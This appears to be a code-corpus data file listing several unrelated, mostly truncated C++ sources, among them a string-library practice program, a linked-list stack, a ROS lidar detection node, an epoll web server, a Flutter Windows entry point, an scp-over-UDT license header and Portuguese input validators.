    "#ifndef _MAIN\r\n#define _MAIN\r\n\r\n#include <iostream>\r\n#include \"biblioteca/funciones/strings.hpp\"\r\n#include \"biblioteca/funciones/tokens.hpp\"\r\n#include \"biblioteca/funciones/files.hpp\"\r\n#include \"biblioteca/tads/parte2/Array.hpp\"\r\n#include \"biblioteca/tads/parte2/Map.hpp\"\r\n#include \"biblioteca/tads/parte2/List.hpp\"\r\n#include \"biblioteca/tads/parte2/Stack.hpp\"\r\n#include \"biblioteca/tads/parte2/Queue.hpp\"\r\n#include \"biblioteca/tads/parte1/Coll.hpp\"\r\n#include \"biblioteca/tads/parte1/MultidimColl.hpp\"\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n   /*\r\n      cout<< length(\"Pirulito\")<<endl;\r\n      tutorial  1+i\r\n      cout<< charCount(\"Apap.ku 6apa\", 'x');\r\n\r\n      string s=\"patata en casa en arg\";\r\n\r\n      cout<< substring(s,2,length(s))<<endl;\r\n      //cout<< substring(s,5)<<endl;\r\n\r\n      int p = indexOf(s,'c');\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,'a',5);\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"en\");\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"ta\",3);\r\n      cout << p << endl;\r\n\r\n      int p = lastIndexOf(s,'e');\r\n      cout << p << endl;\r\n\r\n      char palabrita='D';\r\n        int valor= charToInt(palabrita);\r\n        cout << valor << endl;\r\n\r\n      int numerito=65;\r\n      char letrita= intToChar(numerito);\r\n      cout << letrita << endl;\r\n\r\n      int numerote=4587412;\r\n      int posicion=0;\r\n      int digito= getDigit(numerote,posicion);\r\n      cout<< digito<<endl;\r\n\r\n      int digitocontador= digitCount(numerote);\r\n      cout<< digitocontador<<endl;\r\n\r\n      int numero=123;\r\n      string resultado = intToString(numero);\r\n      cout<<resultado<<endl;\r\n\r\n      int b=16;\r\n      string cadenaStringtoInt =\"12AB\"; //Ingresar binarios decimal o hexa\r\n      int iStringtoint= stringToInt(cadenaStringtoInt,b);\r\n      cout<<iStringtoint<<endl;\r\n\r\n      string ssobrecar=\"12323\";\r\n      int istringtoubtsobre= stringToInt(ssobrecar);\r\n      cout<<istringtoubtsobre<<endl;\r\n\r\n      char cchartistring = ' ';\r\n      string sChartostring = charToString(cchartistring);\r\n      cout << sChartostring << endl; // muestra: A\r\n      cout << length(sChartostring) << endl; // muestra: 1\r\n        return 0;\r\n\r\n      string sStringtochar = \" \";\r\n      char cstringtochar = stringToChar(sStringtochar);\r\n      cout << cstringtochar << endl; // muestra: A\r\n      cout << (int)cstringtochar << endl; // muestra: 65\r\n\r\n      string s = \"10\";\r\n      int i = stringToInt(s,10);\r\n      cout << i << endl;\r\n      int i = stringToInt(s);\r\n      cout << i << endl;\r\n\r\n      string s = stringToString(\"Hola\");\r\n      cout << s << endl;\r\n\r\n      double d = 123.4;\r\n      string s = doubleToString(d);\r\n      cout << s << endl;\r\n\r\n      string s = \"123.4\";\r\n      double d = stringToDouble(s);\r\n      cout << d << endl;\r\n\r\n      string s = \"\";\r\n      cout << isEmpty(s) << endl;\r\n\r\n      string s1 = \"cursoDeAlgoritmos\";\r\n      string s2 = \"c\";\r\n      if( startsWith(s1,s2) )\r\n      {\r\n         cout << s2 << \" es prefijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es prefijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s1 = \"curso de patatas\";\r\n      string s2 = \"patatas\";\r\n      if( endsWith(s1,s2) )\r\n      {\r\n      cout << s2 << \" es sufijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es sufijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s = \"abcd\";\r\n      char c = 'a';\r\n      if( contains(s,c) )\r\n      {\r\n         cout << s << \" contiene a: \" << c << endl;\r\n      }\r\n      else\r\n      {\r\n         cout << s << \" NO contiene a: \" << c << endl;\r\n      }\r\n\r\n      string s = \"Esto es una prueba\";\r\n      string r = replace(s,'e','X');\r\n      cout << r << endl;\r\n\r\n      string s = \"Esto es una prueba\";\r\n      int pos = 4;\r\n      char c = 'X';\r\n      string r = insertAt(s,pos,c);\r\n      cout << r << endl;\r\n\r\n      int n = 5;\r\n      string r = spaces(n);\r\n      // muestra: [ ] (cinco espacios)\r\n      cout << \"[\" << r << \"]\" << endl;\r\n\r\n   char c = '3';\r\n   if( isDigit(c) )\r\n   {\r\n   cout << c << \" es digito\" << endl;\r\n   }\r\n   else\r\n   {\r\n   cout << c << \" NO es digito\" << endl;\r\n   }\r\n\r\n   char c = 'X';\r\n   if( isLetter(c) )\r\n   {\r\n   cout << c << \" es letra\" << endl; // SALIDA\r\n   }\r\n   else\r\n   {\r\n      cout << c << \" NO es letra\" << endl;\r\n   }\r\n  }\r\n\r\n   string s1 = \"Pablo\";\r\n   string s2 = \"Queso\";\r\n   if( cmpString(s1,s2)<0 )\r\n   {\r\n   cout << s1 << \" es menor que: \" << s2 << endl;\r\n   }\r\n   else if(cmpString(s1,s2)>0){\r\n   cout << s1 << \" es mayor que: \" << s2 << endl;\r\n   }\r\n   else{\r\n   cout << s1 << \" es igual que: \" << s2 << endl;\r\n   }\r\n\r\n   double x = 25.7;\r\n   double y = 36.9;\r\n   if( cmpDouble(x,y)<0 )\r\n   {\r\n   cout << x << \" es menor que: \" << y << endl;\r\n   }\r\n   else if(cmpDouble(x,y)>0){\r\n      cout << x << \" es mayor que: \" << y << endl;\r\n      }\r\n   else{\r\n      cout << x << \" es igual que: \" << y << endl;\r\n     }\r\n\r\n   char c = 'n';\r\n   char r = toUpperCase(c);\r\n   cout << r << endl;\r\n   }\r\n\r\n   char c = 'n';\r\n   char r = toLowerCase(c);\r\n   cout << r << endl;\r\n\r\n   string s = \"",
    "#include <iostream>\nusing namespace std;\n\nclass node{\n\npublic:\n\nint data;\nnode *next;\n\nnode (int data){\n\n  this->data=data;\n  next=NULL;\n}\n};\nclass stack{\npublic:\nnode *head;\nint size;\nstack(int size){\n    this->size=size;\n    this->head=NULL;\n}\n\n//for following LIFO principle, we will insert the elements in the beginning\nvoid push(int data){\n\n  //creating a node\n  node *newNode=new node(data);\n  \n  if(head==NULL){\n    head=newNode;\n    cout<<data<<\" pushed successfully.\"<<endl;\n    return ;\n  }\n\n  newNode->next=head;\n  head=newNode;\n  cout<<data<<\" pushed successfully.\"<<endl;\n  \n}\n\nvoid pop(){\n\n  if(head==NULL){\n    cout<<\"Stack is empty.Pop operation not possible.\"<<endl;\n    return;\n  }\n\n  node *temp=head;\n  head=temp->next;\n  temp->next=NULL;\n  delete temp;\n  cout<<\"Pop operation got successfull.\"<<endl;\n  \n}\n\nvoid top(){\n\n  if(head==NULL){\n    cout<<\"Stack is empty.\"<<endl;\n    return;\n  }\n\n  node *temp=head;\n  cout<<\"Top most element in stack is:\"<<temp->data<<endl;\n}\n\nint size(){\n\n  int length=0;\n  node *temp=head;\n\n  while(temp!=NULL){\n    length++;\n    temp=temp->next;\n  }\n\n  return length;  \n}\n\nbool isEmpty(){\n\n  if(head==NULL){\n    return 1;\n  }\n\n  return 0;\n}\n\n\n\nint main(){\n\n stack s(5);\n  s.push(2);\n  push(4);\n  push(7);\n  push(12);\n  push(14);\n  push(74);\n  top();\n  \n  cout<<\"Size of stack is:\"<<size()<<endl;\n  pop();\n  pop();\n\n  top();\n  cout<<\"Size of stack is:\"<<size()<<endl;\n  pop();\n  pop();\n  pop();\n  pop();\n  cout<<\"Empty:\"<<isEmpty()<<endl; \n  \n}\n};\n\n",
    "#include <visit.h>\n\nstd::string Generate114::Visit(long long num)\n{\n    if (num < 0)\n        goto NEGATIVE_NUMBERS;\n    else if (num < 200)\n        goto SMALL_POSITIVE_NUMBERS;\n    else if (num < 1000)\n        goto MID_POSITIVE_NUMBERS;\n    else\n        goto LARGE_POSITIVE_NUMBERS;\n\n\nNEGATIVE_NUMBERS:\n    if (num == -1)\n    {\n        return \"11-4-5+1-4\";\n    }\n    goto FINAL;\n\nSMALL_POSITIVE_NUMBERS:\n    if (num == 0)\n    {\n        return \"(1-1)*4514\";\n    }\n    if (num == 1)\n    {\n        return \"11/(45-1)*4\";\n    }\n    if (num == 2)\n    {\n        return \"-11+4-5+14\";\n    }\n    if (num == 3)\n    {\n        return \"11*-4+51-4\";\n    }\n    if (num == 4)\n    {\n        return \"-11-4+5+14\";\n    }\n    if (num == 5)\n    {\n        return \"11-4*5+14\";\n    }\n    if (num == 6)\n    {\n        return \"1-14+5+14\";\n    }\n    if (num == 7)\n    {\n        return \"11-4+5-1-4\";\n    }\n    if (num == 8)\n    {\n        return \"11-4+5/1-4\";\n    }\n    if (num == 9)\n    {\n        return \"11-4+5+1-4\";\n    }\n    if (num == 10)\n    {\n        return \"-11/4+51/4\";\n    }\n    if (num == 11)\n    {\n        return \"11*-4+51+4\";\n    }\n    if (num == 12)\n    {\n        return \"-11+4+5+14\";\n    }\n    if (num == 13)\n    {\n        return \"1*14-5/1+4\";\n    }\n    if (num == 14)\n    {\n        return \"11+4-5/1+4\";\n    }\n    if (num == 15)\n    {\n        return \"1+14-5+1+4\";\n    }\n    if (num == 16)\n    {\n        return \"11-4-5+14\";\n    }\n    if (num == 17)\n    {\n        return \"11+4*5-14\";\n    }\n    if (num == 18)\n    {\n        return \"1+1+4*5*1-4\";\n    }\n    if (num == 19)\n    {\n        return \"1+1+4*5+1-4\";\n    }\n    if (num == 20)\n    {\n        return \"-11+45-14\";\n    }\n    if (num == 21)\n    {\n        return \"-1-1+4+5+14\";\n    }\n    if (num == 22)\n    {\n        return \"1*14+5-1+4\";\n    }\n    if (num == 23)\n    {\n        return \"1*14-5+14\";\n    }\n    if (num == 24)\n    {\n        return \"1+14-5+14\";\n    }\n    if (num == 25)\n    {\n        return \"11*4-5-14\";\n    }\n    if (num == 26)\n    {\n        return \"11-4+5+14\";\n    }\n    if (num == 27)\n    {\n        return \"11+4*5/1-4\";\n    }\n    if (num == 28)\n    {\n        return \"11+4*5+1-4\";\n    }\n    if (num == 29)\n    {\n        return \"-11+45-1-4\";\n    }\n    if (num == 30)\n    {\n        return \"1*-1+45-14\";\n    }\n    if (num == 31)\n    {\n        return \"1/1*45-14\";\n    }\n    if (num == 32)\n    {\n        return \"1*1+45-14\";\n    }\n    if (num == 33)\n    {\n        return \"1+1+45-14\";\n    }\n    if (num == 34)\n    {\n        return \"1-14+51-4\";\n    }\n    if (num == 35)\n    {\n        return \"11*4+5-14\";\n    }\n    if (num == 36)\n    {\n        return \"11+4*5+1+4\";\n    }\n    if (num == 37)\n    {\n        return \"-11+45-1+4\";\n    }\n    if (num == 38)\n    {\n        return \"-11+45*1+4\";\n    }\n    if (num == 39)\n    {\n        return \"-11+45+1+4\";\n    }\n    if (num == 40)\n    {\n        return \"-11+4*51/4\";\n    }\n    if (num == 41)\n    {\n        return \"1/1*45*1-4\";\n    }\n    if (num == 42)\n    {\n        return \"11+45-14\";\n    }\n    if (num == 43)\n    {\n        return \"1+1*45+1-4\";\n    }\n    if (num == 44)\n    {\n        return \"114-5*14\";\n    }\n    if (num == 45)\n    {\n        return \"11+4*5+14\";\n    }\n    if (num == 46)\n    {\n        return \"11*4+5+1-4\";\n    }\n    if (num == 47)\n    {\n        return \"1/-1+45-1+4\";\n    }\n    if (num == 48)\n    {\n        return \"-11+45+14\";\n    }\n    if (num == 49)\n    {\n        return \"1*1*45/1+4\";\n    }\n    if (num == 50)\n    {\n        return \"1+1*45/1+4\";\n    }\n    if (num == 51)\n    {\n        return \"11+45-1-4\";\n    }\n    if (num == 52)\n    {\n        return \"11+45/1-4\";\n    }\n    if (num == 53)\n    {\n        return \"11+45+1-4\";\n    }\n    if (num == 54)\n    {\n        return \"11-4+51-4\";\n    }\n    if (num == 55)\n    {\n        return \"-1+14*5-14\";\n    }\n    if (num == 56)\n    {\n        return \"1*14*5-14\";\n    }\n    if (num == 57)\n    {\n        return \"1+14*5-14\";\n    }\n    if (num == 58)\n    {\n        return \"-1+1*45+14\";\n    }\n    if (num == 59)\n    {\n        return \"114-51-4\";\n    }\n    if (num == 60)\n    {\n        return \"11+45*1+4\";\n    }\n    if (num == 61)\n    {\n        return \"1+1+45+14\";\n    }\n    if (num == 62)\n    {\n        return \"1+14+51-4\";\n    }\n    if (num == 63)\n    {\n        return \"11*4+5+14\";\n    }\n    if (num == 64)\n    {\n        return \"11*4+5*1*4\";\n    }\n    if (num == 65)\n    {\n        return \"1*14*5-1-4\";\n    }\n    if (num == 66)\n    {\n        return \"1*14*5-1*4\";\n    }\n    if (num == 67)\n    {\n        return \"1-1*4+5*14\";\n    }\n    if (num == 68)\n    {\n        return \"1+1-4+5*14\";\n    }\n    if (num == 69)\n    {\n        return \"1*14+51+4\";\n    }\n    if (num == 70)\n    {\n        return \"11+45+14\";\n    }\n    if (num == 71)\n    {\n        return \"(1+14)*5-1*4\";\n    }\n    if (num == 72)\n    {\n        return \"-1-1+4+5*14\";\n    }\n    if (num == 73)\n    {\n        return \"1*14*5-1+4\";\n    }\n    if (num == 74)\n    {\n        return \"1/1*4+5*14\";\n    }\n    if (num == 75)\n    {\n        return \"1+14*5*1+4\";\n    }\n    if (num == 76)\n    {\n        return \"1+1+4+5*14\";\n    }\n    if (num =",
    "#include <ros/ros.h>\n#include <sensor_msgs/LaserScan.h>\t\n\nusing namespace std;\n\nint sum_point = 0;\ndouble roi_distance = 1.5;\t \t//unit : m\t\t\n\ndouble Rad2Deg(double rad)\n{\n\tdouble deg = rad * 180/M_PI;\n\treturn deg;\n}\n\ndouble Deg2Rad(double deg)\n{\n\tdouble rad = deg * M_PI/180;\n\treturn rad;\n}\n\nvoid scanCallback(const sensor_msgs::LaserScan::ConstPtr& scan) \n{\n    int count = scan->scan_time / scan->time_increment;\n\t//int count=(int)(360./RAD2DEG(scan->angle_increment));\n\n    sum_point = 0;\n\n    for(int i=0; i<count; i++) \n\t{\n\t\tdouble point_rad = scan->angle_min + scan->angle_increment * i;\n\t\tdouble point_deg = Rad2Deg(point_rad);\n\n        if((point_deg >= -1*30)&&(point_deg <= 30)) \n        {\n\t\t\tif((scan->ranges[i] <= roi_distance)&&(scan->ranges[i] >= scan->range_min))\n\t\t\t{\n\t\t\t\tsum_point++;\n\n\t\t\t\tdouble point_x = scan->ranges[i]*cos(point_rad);\n\t\t\t\tdouble point_y = scan->ranges[i]*sin(point_rad);\n\t\t\t\n\t\t\t\tcout << sum_point << \" : [X : \" <<point_x << \"m, Y : \" << point_y << \"m]\" << endl;\n\t\t\t}\n        }\n    }\n}\n\nint main(int argc, char **argv)\n{\n\tros::init(argc, argv, \"Lidar_detect_node\");\n\tros::NodeHandle nh;\n\n\tros::Rate rate(8);\n\n\tros::Subscriber lidar_sub = nh.subscribe<sensor_msgs::LaserScan>(\"/scan\", 100, &scanCallback);\n\t\n\twhile(ros::ok())\n\t{\n\t\tif(sum_point > 10)\n\t\t{\n\t\t\tROS_INFO(\"-----Object Detect!-----\");\n\t\t\tROS_INFO(\"Sum : %d\", sum_point);\n\t\t\tcout << \" \" << endl;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tROS_INFO(\"-------------------------\");\n\t\t}\n\t\t\n\t\tros::spinOnce();\n\t\t\n\t\trate.sleep();\n\t}\n\t\n\tros::spin();\n\n\treturn 0;\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Server.cpp                                         :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: yu <yu@student.42.fr>                      +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/07 16:05:27 by ychen2            #+#    #+#             */\n/*   Updated: 2024/05/16 12:52:35 by yu               ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include <unistd.h>\n#include <algorithm>\n#include <iostream>\n#include <utility>\n#include <cerrno>\n#include <cstdio>\n#include \"Server.hpp\"\n#include \"State.hpp\"\n\nbool\tServer::_constructed = false;\n\nstatic void close_fds(std::vector<int> & fds) {\n\tfor (std::vector<int>::iterator it = fds.begin(); it != fds.end(); it++) {\n\t\tclose(*it);\n\t}\n}\n\nstatic bool is_socket(std::vector<int> & socks, int fd) {\n\treturn std::find(socks.begin(), socks.end(), fd) == socks.end() ? false : true;\n}\n\nstatic std::vector< std::pair<int, t_state> >::iterator get_state(std::vector< std::pair<int, t_state> > & states, int fd) {\n\tfor (std::vector <std::pair<int, t_state> >::iterator it = states.begin(); it != states.end(); it++) {\n\t\tif (it->first == fd)\n\t\t\treturn it;\n\t}\n\treturn states.end();\n}\n\nServer::Server(std::vector<Settings> & servers) {\n\tif (_constructed)\n\t\tthrow AlreadyConstructed();\n\t_constructed = true;\n\n\t// create epoll instance\n\t_epoll_fd = epoll_create(1);\n\tif (_epoll_fd == -1)\n\t\tthrow CreatEpollFail();\n\n\t// set socket for all servers, bind and listen.\n\t{\n\t\tfor (std::vector<Settings>::iterator it = servers.begin(); it != servers.end(); it++) {\n\t\t\tint new_socket_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);\n\t\t\tif (new_socket_fd < 0) {\n\t\t\t\tclose(_epoll_fd);\n\t\t\t\tthrow SocketFail();\n\t\t\t}\n\t\t\t_socks_fd.push_back(new_socket_fd);\n\t\t\t{\n\t\t\t\tint on = 1;\n\t\t\t\tif (setsockopt(new_socket_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on)) < 0) {\n\t\t\t\t\tclose_fds(_socks_fd);\n\t\t\t\t\tclose(_epoll_fd);\n\t\t\t\t\tthrow SetSockOptFail();\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (bind(new_socket_fd, (struct sockaddr *)&(it->_addr), sizeof(it->_addr)) < 0) {\n\t\t\t\tclose_fds(_socks_fd);\n\t\t\t\tclose(_epoll_fd);\n\t\t\t\tthrow BindFail();\n\t\t\t}\n\t\t\tif (listen(new_socket_fd, BACK_LOG) < 0) {\n\t\t\t\tclose_fds(_socks_fd);\n\t\t\t\tclose(_epoll_fd);\n\t\t\t\tthrow ListenFail();\n\t\t\t}\n\t\t\t// Setting up sockets for epoll\n\t\t\t{\n\t\t\t\tstruct epoll_event ev;\n\t\t\t\tev.events = EPOLLIN;\n\t\t\t\tev.data.fd = new_socket_fd;\n\t\t\t\tif (epoll_ctl(_epoll_fd, EPOLL_CTL_ADD, new_socket_fd, &ev) < 0) {\n\t\t\t\t\tclose_fds(_socks_fd);\n\t\t\t\t\tclose(_epoll_fd);\n\t\t\t\t\tthrow EpollCtlFail();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid\tServer::run() {\n\tstruct epoll_event\tevents[MAX_EVENTS], ev;\n\tint\t\t\t\t\tnfds;\n\tstd::vector< std::pair<int, t_state> >\tstates;\n\n\twhile (1) {\n\t\tnfds = epoll_wait(_epoll_fd, events, MAX_EVENTS, -1);\n\t\tif (nfds == -1)\n\t\t\tthrow EpollWaitFail();\n\t\t// Process all returned events\n\t\tfor (int i = 0; i < nfds; i++) {\n\t\t\t// Check if the event is for a server socket\n\t\t\tif (is_socket(_socks_fd, events[i].data.fd)) {\n\t\t\t\tint new_sd;\n\t\t\t\t// Accept new connections\n\t\t\t\twhile ((new_sd = accept(events[i].data.fd, NULL, NULL)) != -1) {\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = new_sd;\n\t\t\t\t\tif (epoll_ctl(_epoll_fd, EPOLL_CTL_ADD, new_sd, &ev) == -1)\n\t\t\t\t\t\tthrow EpollCtlFail();\n\t\t\t\t\tt_state\tnew_conn;\n\t\t\t\t\tstates.push_back(std::make_pair(new_sd, new_conn));\n\t\t\t\t}\n\t\t\t\tif (errno != EWOULDBLOCK)\n\t\t\t\t\tthrow AcceptFail();\n\t\t\t}\n\t\t\t// If the event is not in _socks_fd, handle recv/send\n\t\t\telse {\n\t\t\t\tchar\t\t\t\t\t\t\t\t\t\t\t\tbuffer[BUFFER_SIZE];\n\t\t\t\tstd::vector< std::pair<int, t_state> >::iterator\tcur_state;\n\t\t\t\tbool\t\t\t\t\t\t\t\t\t\t\t\tclose_conn = false;\n\n\t\t\t\tcur_state = get_state(states, events[i].data.fd);\n\t\t\t\tif (events[i].events & EPOLLOUT) {\n\t\t\t\t\t// Handle write event\n\t\t\t\t\tint\twc;\n\t\t\t\t\tif (cur_state->second.buffer.size()) {\n\t\t\t\t\t\twc = send(events[i].data.fd, cur_state->second.buffer.c_str(), cur_state->second.buffer.size(), 0);\n\t\t\t\t\t}\n\t\t\t\t\tif (wc < 0) {\n\t\t\t\t\t\tperror(\"send() failed\");\n\t\t\t\t\t\tclose_conn = true;\n\t\t\t\t\t}\n\t\t\t\t\telse  {\n\t\t\t\t\t\t// erase the buffer anyway, and keep the connection open\n\t\t\t\t\t\tcur_state->second.buffer.erase(0, wc);\n\t\t\t\t\t\t// If the buffer is empty, we wait for the next request\n\t\t\t\t\t\tif (cur_state->second.buffer.empty()) {\n\t\t\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\t\t\tev.data.fd = cur_state->first;\n\t\t\t\t\t\t\tif (epoll_ctl(_epoll_fd, EPOLL_CTL_MOD, cur_state->first, &ev) == -1)\n\t\t\t\t\t\t\t\tthrow EpollCtlFail();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (events[i].events & EPOLLIN) {\n\t\t\t\t\tint\trc;\n\t\t\t\t\tif (cur_state == states.end())\n\t\t\t\t\t\tthrow std::runtime_error(\"State not found\");\n\t\t\t\t\trc = recv(events[i].dat",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"languange_servise_shared_preferences\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/********************************************************************************\n$Id: hscp.cpp 102 2010-12-26 13:47:53Z bunpojpn $\n\nhscp.cpp v 0.9.20 2010-12-25\nCopyright (c) 2009,2010 RCCS technical team of IMS,\n   Fumiyasu Mizutani,\n   Fumitsuna Teshima, Masataka Sawa,\n   Shigeki Naitoh,    Jun-ichi Matsuo,\n   Kensuke Iwahashi,  Takakazu Nagaya.\nAll rights reserved.\nWe special thanks to\n   Hironori Kogawa (Hitachi, Ltd., for the first try to merge UDT into scp),\n   UDT distributer (the board of trustees of the University of Illinois),\n   OpenSSH distributers, and other open source distributers.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this list of\n    conditions and the following disclaimer.\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation and/or\n    other materials provided with the distribution.\n  * Neither the name of the \"NINS (National Institutes of Natural Sciences),\n    IMS (Institute for Molecular Science)\" nor the names of its contributors may be\n    used to endorse or promote products derived from this software without specific\n    prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\nEXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANT ABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL\nTHE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\nPROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\nSTRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF\nTHE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*********************************************************************************/\n/* Original copyrights of scp.c is under this line,                             */\n/********************************************************************************/\n/* $OpenBSD: scp.c,v 1.165 2009/12/20 07:28:36 guenther Exp $ */\n/*\n * scp - secure remote copy.  This is basically patched BSD rcp which\n * uses ssh to do the data transfer (instead of using rcmd).\n *\n * NOTE: This version should NOT be suid root.  (This uses ssh to\n * do the transfer and ssh has the necessary privileges.)\n *\n * 1995 Timo Rinne <tri@iki.fi>, Tatu Ylonen <ylo@cs.hut.fi>\n *\n * As far as I am concerned, the code I have written for this software\n * can be used freely for any purpose.  Any derived versions of this\n * software must be clearly marked as such, and if the derived work is\n * incompatible with the protocol description in the RFC file, it must be\n * called by a name other than \"ssh\" or \"Secure Shell\".\n */\n/*\n * Copyright (c) 1999 Theo de Raadt.  All rights reserved.\n * Copyright (c) 1999 Aaron Campbell.  All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n/*\n * Parts from:\n *\n * Copyright (c) 1983, 1990, 1992, 1993, 1995\n *\tThe Regents of the University of California.  All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *   ",
    "#include <iostream>\n#include <cctype>\n#include <string>\n#include <cstdlib> \n\n#include \"dominios.h\"\n\nusing namespace std;\n\n//-------------------(Classe-Nome)---------------------------------//\nvoid Nome::validar(string nome) {\n    if(nome.length() < 3 || nome.length() > 10)\n        throw invalid_argument(\"Nome: Nome invalido.\");\n    \n    if(!isupper(nome[0]))\n        throw invalid_argument(\"Nome: O primeiro caractere de cada termo deve ser maiusculo\");\n    \n    // Valida se tem algum caractere que n\u00e3o seja letra na string atrav\u00e9s do seu valor ascii.\n    for(char caractere : nome) {\n        int ascii = caractere;\n\n        if(!((ascii >= 97 && ascii <= 122) || (ascii >= 65 && ascii <= 90)))\n            throw invalid_argument(\"Nome: Caractere invalido\");\n    }\n}\n\nvoid Nome::setNome(string nome) {\n    \n    int posicao = nome.find(' '); // Encontra a posi\u00e7\u00e3o do espa\u00e7o caso seja um nome composto\n\n    if(posicao == -1) { // Se a posicao \u00e9 igual a -1 significa que n\u00e3o \u00e9 um nome composto\n        validar(nome);\n        this ->nome = nome;\n\n    } else {\n        validar(nome.substr(0, posicao)); //Reparte a string at\u00e9 o primeiro nome\n        validar(nome.substr(posicao + 1)); //Reparte a string para obter o sobrenome\n\n        this->nome = nome.substr(0, posicao);\n        this->sobrenome = nome.substr(posicao + 1); \n    }\n}\n\n//-------------------(Classe-Senha)---------------------------------//\n\nbool Senha::sequenciaCrescente(string senha) {\n    if(senha.length() <= 2)\n        return false;\n\n    for(int i = 0; i < senha.length() - 1; i++){\n        if(senha[i] != senha[i + 1] + 1)\n            return false;\n    }\n\n    return true;\n}\n\nbool Senha::sequenciaDecrescente(string senha) {\n    if(senha.length() <= 2)\n        return false;\n\n    for(int i = 0; i < senha.length() - 1; i++){\n        if(senha[i] != senha[i + 1] - 1)\n            return false;\n    }\n\n    return true;\n}\n\nvoid Senha::validar(string senha) {\n    if(senha.length() > LIMITE)\n        throw invalid_argument(\"Senha: Limite m\u00e1ximo de caracteres 